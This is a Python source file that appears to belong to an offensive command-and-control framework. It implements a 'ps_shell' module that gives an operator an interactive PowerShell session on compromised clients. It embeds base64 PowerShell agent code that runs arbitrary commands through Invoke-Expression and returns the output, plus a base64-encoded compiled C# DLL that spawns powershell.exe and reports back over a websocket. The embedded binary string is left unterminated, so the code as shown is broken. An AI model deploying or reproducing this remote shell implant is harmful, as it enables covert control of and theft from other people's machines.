import base64
import os
import shlex

from prompt_toolkit import prompt

from modules.base import BaseModule, ClientModuleNotLoaded


class Module(BaseModule):
    MODULE_NAME = 'ps_shell'

    CLIENT_TYPE_POWERSHELL = 0
    CLIENT_TYPE_CSHARP = 1

    def __init__(self):
        self.running = False

    @staticmethod
    def get_commands() -> [[str]]:
        return [
            ['ps_shell', '<client>', 'Starts a Powershell session from selected client']
        ]

    def get_client_code(self, client_type):
        if client_type == self.CLIENT_TYPE_POWERSHELL:
            return base64.b64encode('''
                try{
                    Write-Log "Executing command: '$($args[0].command)'";$result = Invoke-Expression $args[0].command | Out-String
                    if(!$result) { $result = " " }
                }catch{
                    $result = $PSItem.Exception.Message
                }
                $response = @{"service" = "ps_shell"; "result" = Encode-base64 $result; "prompt" = Encode-base64 "PS $($pwd.Path)> " }
                Send-Message -Msg $response -To $args[2]
            '''.encode()).decode()
        elif client_type == self.CLIENT_TYPE_CSHARP:
            return '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FQAEgAAAAQAAAAAAAAAAAAAAAAByAAAABQAAAAAAAAAAAAAAYwCLAAAAAAABAAAAAAAAAAAAAAAAAAEAAAAAAAEAAAAEAAAAAAAAAGwAmAIAAAAABQAAAAAAAAAAAAAAdQBSAgAAAAAFAAAAAAAAAAAAAABjAEkDAAAAAEsAXgAAAAAAAEMyAGdldF9VVEY4ADxNb2R1bGU+AFN5c3RlbS5JTwBQYXlsb2FkAHNldF9wYXlsb2FkAFJlYWRUb0VuZABnZXRfY29tbWFuZABTZW5kAHNldF9zZXJ2aWNlAElEaXNwb3NhYmxlAEJhc2VNb2R1bGUAU2hlbGxNb2R1bGUAc2V0X0ZpbGVOYW1lAFN5c3RlbS5SdW50aW1lAFJlc3BvbnNlAERpc3Bvc2UARGVidWdnYWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5SW5mb3JtYXRpb25hbFZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBzZXRfVXNlU2hlbGxFeGVjdXRlAFNlcmlhbGl6ZQBFbmNvZGluZwBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAFRvQmFzZTY0U3RyaW5nAEMyLnV0aWwAU2hlbGxNb2R1bGUuZGxsAFN5c3RlbQBUcmltAHNldF9hY3Rpb24AU3lzdGVtLlJlZmxlY3Rpb24AU3lzdGVtLlRleHQuSnNvbgBnZXRfU3RhcnRJbmZvAFByb2Nlc3NTdGFydEluZm8Ac2V0X3RvAFdlYlNvY2tldFNoYXJwAHdlYnNvY2tldC1zaGFycABTdHJlYW1SZWFkZXIAVGV4dFJlYWRlcgBzZXJ2ZXIASnNvblNlcmlhbGl6ZXIALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkNv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

    def run(self, command):

        command_split = shlex.split(command)
        if len(command_split) < 2:
            print('[-] Invalid arguments. You must indicate the client.')
            return
        client_id = self.c2_manager.get_client_id_by_client_name(command_split[1])

        try:
            self.c2_manager.master_connection.send_service(client_id, self.MODULE_NAME, {'command': 'pwd'})
            response = self.c2_manager.master_connection.recv_service_response(client_id, self.MODULE_NAME)

            if response is None:
                return

            if 'error' in response and response['error'] == ClientModuleNotLoaded.CLIENT_ERROR_CODE_MODULE_NOT_FOUND and 'client_type' in response:
                raise ClientModuleNotLoaded(client_id, self.MODULE_NAME, response['client_type'])

            client_prompt = base64.b64decode(response['prompt']).decode()
            while True:

                commands = None
                user_input = prompt('C2 [{}/{}] {}'.format(self.parameters['environment'], self.c2_manager.get_client_name_by_client_id(client_id), client_prompt))

                if user_input == 'clear':
                    os.system('clear')
                    continue

                if user_input == 'exit':
                    resp = prompt('\n[!] Are you sure you want to exit the shell? Y/n: ')
                    if resp.lower() == 'y' or not resp:
                        break
                    else:
                        continue

                if '>>>' in user_input:
                    user_input_split = user_input.split('>>>')
                    user_input = user_input_split[0]
                    commands = user_input_split[1]

                elif user_input.startswith('!'):
                    print(os.system(user_input[1:].strip()))
                    continue

                self.c2_manager.master_connection.send_service(client_id, self.MODULE_NAME, {'command': user_input})
                response = self.c2_manager.master_connection.recv_service_response(client_id, self.MODULE_NAME)

                result = response['result']
                if commands is not None:
                    command = 'echo "{}" | base64 -d | {}'.format(result, commands)
                    os.system(command)
                else:
                    print(base64.b64decode(result).decode())
                client_prompt = base64.b64decode(response['prompt']).decode()

        except KeyboardInterrupt:
            print('\n[!] Are you sure you want to exit the shell? Y/N')
            resp = input().lower()
            if resp != 'y':
                self.run(command)
